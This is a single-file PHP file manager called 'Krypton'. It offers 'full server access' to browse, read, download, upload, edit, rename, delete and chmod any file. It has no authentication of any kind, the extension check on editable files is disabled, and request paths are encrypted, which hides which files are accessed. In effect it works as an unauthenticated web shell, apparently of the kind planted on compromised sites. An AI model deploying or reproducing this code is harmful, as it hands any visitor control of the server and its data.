<?php
/**
 * Krypton File Manager
 * A single-file PHP file manager with full server access and enhanced features
 */

// Start session
session_start();

// Configuration
define('VERSION', '1.0.0');
define('MAX_UPLOAD_SIZE', 100 * 1024 * 1024); // 100MB max upload size
define('ENCRYPTION_KEY', 'RCnFfs06w3ItXaCn7BWvyyFE1Rxdmz'); // Change this to a random string for security
define('SESSION_TIMEOUT', 1800); // 30 minutes session timeout

// Check if encryption key is default and show warning
$encryptionKeyWarning = '';
if (ENCRYPTION_KEY === 'change_this_to_a_random_string') {
    $encryptionKeyWarning = 'Warning: Default encryption key is being used. Please change it for security.';
}

// Session timeout check
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
    // Session expired
    session_unset();
    session_destroy();
}
$_SESSION['last_activity'] = time(); // Update last activity time

// Encryption and decryption functions
function encryptPath($path) {
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($path, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
    return base64_encode($encrypted . '::' . base64_encode($iv));
}

function decryptPath($encryptedPath) {
    try {
        $decoded = base64_decode($encryptedPath);
        if ($decoded === false) {
            return getcwd(); // Default to current directory if decoding fails
        }
        
        if (strpos($decoded, '::') === false) {
            return getcwd(); // Default to current directory if separator not found
        }
        
        list($encrypted_data, $iv_b64) = explode('::', $decoded, 2);
        $iv = base64_decode($iv_b64);
        
        if ($iv === false || strlen($iv) !== 16) {
            return getcwd(); // Default to current directory if IV is invalid
        }
        
        $decrypted = openssl_decrypt($encrypted_data, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
        
        if ($decrypted === false) {
            return getcwd(); // Default to current directory if decryption fails
        }
        
        return $decrypted;
    } catch (Exception $e) {
        return getcwd(); // Default to current directory on any exception
    }
}

// Function to get human-readable file size
function formatFileSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' bytes';
    }
}

// Function to get file permissions in Unix format
function getFilePermissions($file) {
    $perms = fileperms($file);
    
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

// Function to get file extension
function getFileExtension($filename) {
    return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
}

// Function to check if a file is editable
function isEditableFile($filename) {
    /*
    $editableExtensions = ['txt', 'php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'md', 'ini', 'conf', 'log', 'sql', 'htaccess'];
    $extension = getFileExtension($filename);
    return in_array($extension, $editableExtensions);
    */
    return true;
}

// Process actions
$error = '';
$success = '';

// Get and decrypt the path parameter
$currentPath = getcwd(); // Default path

// Check if there's a current path in the session
if (isset($_SESSION['current_path']) && file_exists($_SESSION['current_path']) && is_dir($_SESSION['current_path'])) {
    $currentPath = $_SESSION['current_path'];
}

// Handle POST request for navigation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Store current path for form submissions
    if (isset($_POST['current_path'])) {
        $decryptedCurrentPath = decryptPath($_POST['current_path']);
        if (file_exists($decryptedCurrentPath) && is_dir($decryptedCurrentPath)) {
            $currentPath = $decryptedCurrentPath;
            $_SESSION['current_path'] = $currentPath;
        }
    }
    
    if (isset($_POST['action'])) {
        // Handle file content request for editing
        if ($_POST['action'] === 'getContent' && isset($_POST['path'])) {
            $filePath = decryptPath($_POST['path']);
            if (file_exists($filePath) && !is_dir($filePath) && isEditableFile(basename($filePath))) {
                echo file_get_contents($filePath);
                exit;
            } else {
                echo "Error: Cannot read file.";
                exit;
            }
        }
        
        // Handle navigation
        if ($_POST['action'] === 'navigate' && isset($_POST['path'])) {
            $decryptedPath = decryptPath($_POST['path']);
            if (file_exists($decryptedPath) && is_dir($decryptedPath)) {
                $currentPath = $decryptedPath;
                $_SESSION['current_path'] = $currentPath;
            }
        }
        
        // Handle file download
        if ($_POST['action'] === 'download' && isset($_POST['path'])) {
            $downloadPath = decryptPath($_POST['path']);
            
            if (file_exists($downloadPath) && !is_dir($downloadPath)) {
                // Set headers for file download
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
                header('Content-Transfer-Encoding: binary');
                header('Expires: 0');
                header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
                header('Pragma: public');
                header('Content-Length: ' . filesize($downloadPath));
                ob_clean();
                flush();
                readfile($downloadPath);
                exit;
            }
        }
    }
    
    // Handle file upload
    if (isset($_POST['upload'])) {
        if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $uploadPath = $currentPath . '/' . basename($_FILES['file']['name']);
            
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
                $success = 'File uploaded successfully.';
            } else {
                $error = 'Failed to upload file.';
            }
        } else {
            $error = 'No file selected or upload error.';
        }
    }
    
    // Handle file/directory deletion
    if (isset($_POST['delete']) && isset($_POST['path'])) {
        $deletePath = decryptPath($_POST['path']);
        
        if (file_exists($deletePath)) {
            if (is_dir($deletePath)) {
                // Try to remove directory
                if (rmdir($deletePath)) {
                    $success = 'Directory deleted successfully.';
                } else {
                    $error = 'Failed to delete directory. It may not be empty.';
                }
            } else {
                // Remove file
                if (unlink($deletePath)) {
                    $success = 'File deleted successfully.';
                } else {
                    $error = 'Failed to delete file.';
                }
            }
        } else {
            $error = 'File or directory does not exist.';
        }
    }
    
    // Handle file/directory rename
    if (isset($_POST['rename']) && isset($_POST['oldPath']) && isset($_POST['newName'])) {
        $oldPath = decryptPath($_POST['oldPath']);
        $newName = $_POST['newName'];
        $dirName = dirname($oldPath);
        $newPath = $dirName . '/' . $newName;
        
        if (file_exists($oldPath)) {
            if (rename($oldPath, $newPath)) {
                $success = 'Renamed successfully.';
            } else {
                $error = 'Failed to rename.';
            }
        } else {
            $error = 'File or directory does not exist.';
        }
    }
    
    // Handle permission change
    if (isset($_POST['changePermissions']) && isset($_POST['permPath']) && isset($_POST['permissions'])) {
        $permPath = decryptPath($_POST['permPath']);
        $permissions = $_POST['permissions'];
        
        // Convert from octal string to integer
        $mode = octdec($permissions);
        
        if (file_exists($permPath)) {
            if (chmod($permPath, $mode)) {
                $success = 'Permissions changed successfully.';
            } else {
                $error = 'Failed to change permissions.';
            }
        } else {
            $error = 'File or directory does not exist.';
        }
    }
    
    // Handle file edit
    if (isset($_POST['saveFile']) && isset($_POST['filePath']) && isset($_POST['fileContent'])) {
        $filePath = decryptPath($_POST['filePath']);
        $fileContent = $_POST['fileContent'];
        
        if (file_exists($filePath) && !is_dir($filePath)) {
            if (file_put_contents($filePath, $fileContent) !== false) {
                $success = 'File saved successfully.';
            } else {
                $error = 'Failed to save file.';
            }
        } else {
            $error = 'File does not exist.';
        }
    }
    
    // Handle create new file
    if (isset($_POST['createFile']) && isset($_POST['newFileName'])) {
        $newFileName = $_POST['newFileName'];
        $newFilePath = $currentPath . '/' . $newFileName;
        
        if (!file_exists($newFilePath)) {
            if (file_put_contents($newFilePath, '') !== false) {
                $success = 'File created successfully.';
            } else {
                $error = 'Failed to create file.';
            }
        } else {
            $error = 'File already exists.';
        }
    }
    
    // Handle create new folder
    if (isset($_POST['createFolder']) && isset($_POST['newFolderName'])) {
        $newFolderName = $_POST['newFolderName'];
        $newFolderPath = $currentPath . '/' . $newFolderName;
        
        if (!file_exists($newFolderPath)) {
            if (mkdir($newFolderPath, 0755)) {
                $success = 'Folder created successfully.';
            } else {
                $error = 'Failed to create folder.';
            }
        } else {
            $error = 'Folder already exists.';
        }
    }
}

// Save current path to session
$_SESSION['current_path'] = $currentPath;

// Get directory contents
$items = [];
if (is_dir($currentPath)) {
    if ($handle = opendir($currentPath)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $fullPath = $currentPath . '/' . $entry;
                $isDir = is_dir($fullPath);
                
                try {
                    $size = $isDir ? '-' : formatFileSize(filesize($fullPath));
                    $permissions = getFilePermissions($fullPath);
                    $lastModified = date('Y-m-d H:i:s', filemtime($fullPath));
                    
                    $items[] = [
                        'name' => $entry,
                        'path' => $fullPath,
                        'encryptedPath' => encryptPath($fullPath),
                        'isDirectory' => $isDir,
                        'size' => $size,
                        'permissions' => $permissions,
                        'lastModified' => $lastModified,
                        'isEditable' => !$isDir && isEditableFile($entry)
                    ];
                } catch (Exception $e) {
                    // Skip files that can't be accessed
                    continue;
                }
            }
        }
        closedir($handle);
    }
}

// Sort items: directories first, then files
usort($items, function($a, $b) {
    if ($a['isDirectory'] && !$b['isDirectory']) {
        return -1;
    }
    if (!$a['isDirectory'] && $b['isDirectory']) {
        return 1;
    }
    return strcasecmp($a['name'], $b['name']);
});

// Get breadcrumb parts
$breadcrumbs = [];
$pathParts = explode('/', $currentPath);
$buildPath = '';

foreach ($pathParts as $part) {
    if (empty($part)) {
        $buildPath = '/';
        $breadcrumbs[] = [
            'name' => 'Root',
            'path' => $buildPath,
            'encryptedPath' => encryptPath($buildPath)
        ];
    } else {
        $buildPath .= ($buildPath === '/') ? $part : '/' . $part;
        $breadcrumbs[] = [
            'name' => $part,
            'path' => $buildPath,
            'encryptedPath' => encryptPath($buildPath)
        ];
    }
}

// Get the script's directory for the Home button
$homeDirectory = dirname($_SERVER['SCRIPT_FILENAME']);
$encryptedHomeDirectory = encryptPath($homeDirectory);

// Encrypt current path for forms
$encryptedCurrentPath = encryptPath($currentPath);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Krypton File Manager</title>
    <style>
        /* Base styles and reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Roboto', 'Helvetica', sans-serif;
        }
        
        body {
            background-image: url('https://w.wallhaven.cc/full/ex/wallhaven-exd3w8.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-color: #f9f9f9;
            /* Fallback color */
            color: #333333;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        /* Navigation bar */
        .navbar {
            background-color: #ffffff;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            padding: 15px 0;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .navbar-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .navbar h1 {
            color: #333333;
            font-size: 1.5rem;
            font-weight: 500;
        }
        
        .version {
            font-size: 0.8rem;
            color: #777;
            margin-left: 10px;
        }
        
        .navbar-actions {
            display: flex;
            gap: 10px;
        }
        
        .home-btn {
            background-color: #4a6cf7;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            transition: all 0.2s ease;
        }
        
        .home-btn:hover {
            background-color: #3a5ce5;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        
        .home-icon {
            margin-right: 5px;
        }
        
        /* Breadcrumb navigation */
        .breadcrumb {
            display: flex;
            align-items: center;
            padding: 12px 0;
            margin-bottom: 15px;
            overflow-x: auto;
            white-space: nowrap;
        }
        
        .breadcrumb-item {
            display: flex;
            align-items: center;
        }
        
        .breadcrumb-item a {
            color: #4a6cf7;
            text-decoration: none;
            padding: 5px 8px;
            border-radius: 4px;
            transition: background-color 0.2s;
            cursor: pointer;
        }
        
        .breadcrumb-item a:hover {
            background-color: rgba(74, 108, 247, 0.1);
        }
        
        .breadcrumb-separator {
            margin: 0 5px;
            color: #999;
        }
        
        .breadcrumb-current {
            font-weight: 500;
            padding: 5px 8px;
        }
        
        /* Section styling */
        .section {
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
        }
        
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .section-title {
            font-size: 1.1rem;
            color: #333333;
            font-weight: 500;
        }
        
        .section-actions {
            display: flex;
            gap: 10px;
        }
        
        /* Upload form */
        .upload-form {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
        }
        
        .upload-form input[type="file"] {
            flex: 1;
            min-width: 200px;
            padding: 10px;
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            background-color: #ffffff;
        }
        
        .btn {
            background-color: #4a6cf7;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s ease;
        }
        
        .btn:hover {
            background-color: #3a5ce5;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        
        .btn-sm {
            padding: 6px 12px;
            font-size: 0.9rem;
        }
        
        .btn-success {
            background-color: #28a745;
        }
        
        .btn-success:hover {
            background-color: #218838;
        }
        
        /* File list table */
        .file-table-container {
            overflow-x: auto;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        
        .file-table th {
            background-color: #f5f5f5;
            padding: 12px 15px;
            text-align: left;
            font-weight: 500;
            border-bottom: 1px solid #e0e0e0;
            position: relative;
        }
        
        .file-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .file-table tr:hover {
            background-color: #f5f7ff;
        }
        
        .file-name {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .folder-icon::before {
            content: "📁";
        }
        
        .file-icon::before {
            content: "📄";
        }
        
        /* Action buttons */
        .action-buttons {
            display: flex;
            gap: 8px;
        }
        
        .action-btn {
            background: none;
            border: none;
            cursor: pointer;
            font-size: 1rem;
            color: #555;
            transition: all 0.2s ease;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
        }
        
        .action-btn:hover {
            background-color: #f0f0f0;
            color: #333;
        }
        
        /* Modal styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background-color: white;
            padding: 25px;
            border-radius: 8px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
        }
        
        .modal-content.modal-lg {
            max-width: 800px;
            height: 80%;
            display: flex;
            flex-direction: column;
        }
        
        .modal-title {
            font-size: 1.2rem;
            margin-bottom: 15px;
            font-weight: 500;
        }
        
        .modal-form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .editor-form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            flex-grow: 1;
        }
        
        .form-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        
        .form-group label {
            font-weight: 500;
        }
        
        .form-group input {
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        
        .form-group textarea {
            flex-grow: 1;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            resize: none;
        }
        
        .modal-actions {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 20px;
        }
        
        .btn-cancel {
            background-color: #f0f0f0;
            color: #333;
        }
        
        .btn-cancel:hover {
            background-color: #e0e0e0;
        }
        
        /* Alerts */
        .alert {
            padding: 12px 15px;
            margin-bottom: 15px;
            border-radius: 4px;
            font-weight: 500;
        }
        
        .alert-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .alert-error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .alert-warning {
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 20px 0;
            color: #777;
            font-size: 0.9rem;
        }
        
        /* Loading overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Responsive design */
        @media (max-width: 768px) {
            .upload-form {
                flex-direction: column;
                align-items: stretch;
            }
            
            .upload-form input[type="file"] {
                width: 100%;
            }
            
            .action-buttons {
                flex-wrap: wrap;
            }
            
            .section-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }
            
            .section-actions {
                width: 100%;
            }
            
            .btn {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
    </div>

    <!-- Navigation Bar -->
    <nav class="navbar">
        <div class="container navbar-content">
            <h1>Krypton <span class="version">v<?php echo VERSION; ?></span></h1>
            <div class="navbar-actions">
                <button onclick="navigateTo('<?php echo $encryptedHomeDirectory; ?>')" class="home-btn">
                    <span class="home-icon">🏠</span> Home
                </button>
            </div>
        </div>
    </nav>
    
    <div class="container">
        <!-- Alerts -->
        <?php if (!empty($encryptionKeyWarning)): ?>
        <div class="alert alert-warning"><?php echo $encryptionKeyWarning; ?></div>
        <?php endif; ?>
        
        <?php if (!empty($success)): ?>
        <div class="alert alert-success"><?php echo $success; ?></div>
        <?php endif; ?>
        
        <?php if (!empty($error)): ?>
        <div class="alert alert-error"><?php echo $error; ?></div>
        <?php endif; ?>
        
        <!-- Breadcrumb Navigation -->
        <div class="breadcrumb">
            <?php foreach ($breadcrumbs as $index => $crumb): ?>
                <?php if ($index > 0): ?>
                    <span class="breadcrumb-separator">›</span>
                <?php endif; ?>
                
                <div class="breadcrumb-item">
                    <?php if ($index === count($breadcrumbs) - 1): ?>
                        <span class="breadcrumb-current"><?php echo htmlspecialchars($crumb['name']); ?></span>
                    <?php else: ?>
                        <a onclick="navigateTo('<?php echo $crumb['encryptedPath']; ?>')"><?php echo htmlspecialchars($crumb['name']); ?></a>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
        </div>
        
        <!-- Upload Section -->
        <section class="section">
            <h2 class="section-title">Upload Files</h2>
            <form class="upload-form" method="post" enctype="multipart/form-data">
                <input type="hidden" name="current_path" value="<?php echo $encryptedCurrentPath; ?>">
                <input type="file" name="file">
                <button type="submit" name="upload" class="btn">Upload File</button>
            </form>
        </section>
        
        <!-- File List Section -->
        <section class="section">
            <div class="section-header">
                <h2 class="section-title">Files</h2>
                <div class="section-actions">
                    <button class="btn btn-sm btn-success" onclick="showCreateFileModal()">New File</button>
                    <button class="btn btn-sm" onclick="showCreateFolderModal()">New Folder</button>
                </div>
            </div>
            <div class="file-table-container">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Filename</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Last Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- Parent directory link -->
                        <?php if ($currentPath !== '/'): ?>
                        <tr>
                            <td>
                                <div class="file-name">
                                    <span class="folder-icon"></span>
                                    <a onclick="navigateTo('<?php echo encryptPath(dirname($currentPath)); ?>')">..</a>
                                </div>
                            </td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                        </tr>
                        <?php endif; ?>
                        
                        <!-- File list -->
                        <?php foreach ($items as $item): ?>
                        <tr>
                            <td>
                                <div class="file-name">
                                    <span class="<?php echo $item['isDirectory'] ? 'folder-icon' : 'file-icon'; ?>"></span>
                                    <?php if ($item['isDirectory']): ?>
                                        <a onclick="navigateTo('<?php echo $item['encryptedPath']; ?>')"><?php echo htmlspecialchars($item['name']); ?></a>
                                    <?php else: ?>
                                        <?php echo htmlspecialchars($item['name']); ?>
                                    <?php endif; ?>
                                </div>
                            </td>
                            <td><?php echo $item['size']; ?></td>
                            <td><?php echo $item['permissions']; ?></td>
                            <td><?php echo $item['lastModified']; ?></td>
                            <td>
                                <div class="action-buttons">
                                    <?php if (!$item['isDirectory']): ?>
                                        <button class="action-btn" title="Download" onclick="downloadFile('<?php echo $item['encryptedPath']; ?>')">📥</button>
                                        <?php if ($item['isEditable']): ?>
                                            <button class="action-btn" title="Edit" onclick="showEditFileModal('<?php echo addslashes($item['encryptedPath']); ?>', '<?php echo addslashes($item['name']); ?>')">📝</button>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                    <button class="action-btn" title="Rename" onclick="showRenameModal('<?php echo addslashes($item['encryptedPath']); ?>', '<?php echo addslashes($item['name']); ?>')">✏️</button>
                                    <button class="action-btn" title="Change Permissions" onclick="showPermissionsModal('<?php echo addslashes($item['encryptedPath']); ?>', '<?php echo addslashes($item['name']); ?>')">🔒</button>
                                    <form method="post" style="display:inline;" onsubmit="return confirm('Are you sure you want to delete this <?php echo $item['isDirectory'] ? 'directory' : 'file'; ?>?');">
                                        <input type="hidden" name="current_path" value="<?php echo $encryptedCurrentPath; ?>">
                                        <input type="hidden" name="path" value="<?php echo htmlspecialchars($item['encryptedPath']); ?>">
                                        <button type="submit" name="delete" class="action-btn" title="Delete">🗑️</button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </section>
        
        <footer class="footer">
            Krypton File Manager v<?php echo VERSION; ?> | Single-file PHP File Manager
        </footer>
    </div>
    
    <!-- Rename Modal -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Rename: <span id="renameFileName"></span></h3>
            <form class="modal-form" method="post">
                <input type="hidden" name="current_path" value="<?php echo $encryptedCurrentPath; ?>">
                <input type="hidden" id="renameOldPath" name="oldPath" value="">
                <div class="form-group">
                    <label for="renameNewName">New Name:</label>
                    <input type="text" id="renameNewName" name="newName" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('renameModal')">Cancel</button>
                    <button type="submit" name="rename" class="btn">Rename</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Permissions Modal -->
    <div id="permissionsModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Change Permissions: <span id="permissionsFileName"></span></h3>
            <form class="modal-form" method="post">
                <input type="hidden" name="current_path" value="<?php echo $encryptedCurrentPath; ?>">
                <input type="hidden" id="permissionsPath" name="permPath" value="">
                <div class="form-group">
                    <label for="permissionsOctal">Permissions (Octal):</label>
                    <input type="text" id="permissionsOctal" name="permissions" placeholder="e.g., 0755" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('permissionsModal')">Cancel</button>
                    <button type="submit" name="changePermissions" class="btn">Apply</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Edit File Modal -->
    <div id="editFileModal" class="modal">
        <div class="modal-content modal-lg">
            <h3 class="modal-title">Edit File: <span id="editFileName"></span></h3>
            <form class="editor-form" method="post">
                <input type="hidden" name="current_path" value="<?php echo $encryptedCurrentPath; ?>">
                <input type="hidden" id="editFilePath" name="filePath" value="">
                <div class="form-group" style="flex-grow: 1; display: flex; flex-direction: column;">
                    <textarea id="fileContent" name="fileContent" required></textarea>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('editFileModal')">Cancel</button>
                    <button type="submit" name="saveFile" class="btn">Save</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Create File Modal -->
    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Create New File</h3>
            <form class="modal-form" method="post">
                <input type="hidden" name="current_path" value="<?php echo $encryptedCurrentPath; ?>">
                <div class="form-group">
                    <label for="newFileName">File Name:</label>
                    <input type="text" id="newFileName" name="newFileName" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('createFileModal')">Cancel</button>
                    <button type="submit" name="createFile" class="btn">Create</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Create Folder Modal -->
    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Create New Folder</h3>
            <form class="modal-form" method="post">
                <input type="hidden" name="current_path" value="<?php echo $encryptedCurrentPath; ?>">
                <div class="form-group">
                    <label for="newFolderName">Folder Name:</label>
                    <input type="text" id="newFolderName" name="newFolderName" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('createFolderModal')">Cancel</button>
                    <button type="submit" name="createFolder" class="btn">Create</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Hidden form for navigation -->
    <form id="navigationForm" method="post" style="display: none;">
        <input type="hidden" name="action" value="navigate">
        <input type="hidden" id="navigationPath" name="path" value="">
    </form>
    
    <!-- Hidden form for download -->
    <form id="downloadForm" method="post" style="display: none;">
        <input type="hidden" name="action" value="download">
        <input type="hidden" id="downloadPath" name="path" value="">
    </form>
    
    <script>
        // Show loading overlay
        function showLoading() {
            document.getElementById('loadingOverlay').style.display = 'flex';
        }
        
        // Hide loading overlay
        function hideLoading() {
            document.getElementById('loadingOverlay').style.display = 'none';
        }
        
        // Navigation function
        function navigateTo(path) {
            showLoading();
            document.getElementById('navigationPath').value = path;
            document.getElementById('navigationForm').submit();
        }
        
        // Download function
        function downloadFile(path) {
            document.getElementById('downloadPath').value = path;
            document.getElementById('downloadForm').submit();
        }
        
        // Show rename modal
        function showRenameModal(path, name) {
            document.getElementById('renameFileName').textContent = name;
            document.getElementById('renameOldPath').value = path;
            document.getElementById('renameNewName').value = name;
            document.getElementById('renameModal').style.display = 'flex';
        }
        
        // Show permissions modal
        function showPermissionsModal(path, name) {
            document.getElementById('permissionsFileName').textContent = name;
            document.getElementById('permissionsPath').value = path;
            document.getElementById('permissionsModal').style.display = 'flex';
        }
        
        // Show edit file modal
        function showEditFileModal(path, name) {
            document.getElementById('editFileName').textContent = name;
            document.getElementById('editFilePath').value = path;
            
            showLoading();
            
            // Fetch file content using POST
            const formData = new FormData();
            formData.append('action', 'getContent');
            formData.append('path', path);
            
            fetch(window.location.pathname, {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(content => {
                document.getElementById('fileContent').value = content;
                document.getElementById('editFileModal').style.display = 'flex';
                hideLoading();
            })
            .catch(error => {
                hideLoading();
                alert('Error loading file content: ' + error);
            });
        }
        
        // Show create file modal
        function showCreateFileModal() {
            document.getElementById('newFileName').value = '';
            document.getElementById('createFileModal').style.display = 'flex';
        }
        
        // Show create folder modal
        function showCreateFolderModal() {
            document.getElementById('newFolderName').value = '';
            document.getElementById('createFolderModal').style.display = 'flex';
        }
        
        // Hide modal
        function hideModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
        
        // Close modals when clicking outside
        window.onclick = function(event) {
            if (event.target.className === 'modal') {
                event.target.style.display = 'none';
            }
        }
        
        // Add loading indicator to form submissions
        document.addEventListener('DOMContentLoaded', function() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                form.addEventListener('submit', function() {
                    // Don't show loading for the navigation and download forms
                    if (form.id !== 'navigationForm' && form.id !== 'downloadForm') {
                        showLoading();
                    }
                });
            });
        });
    </script>
</body>
</html>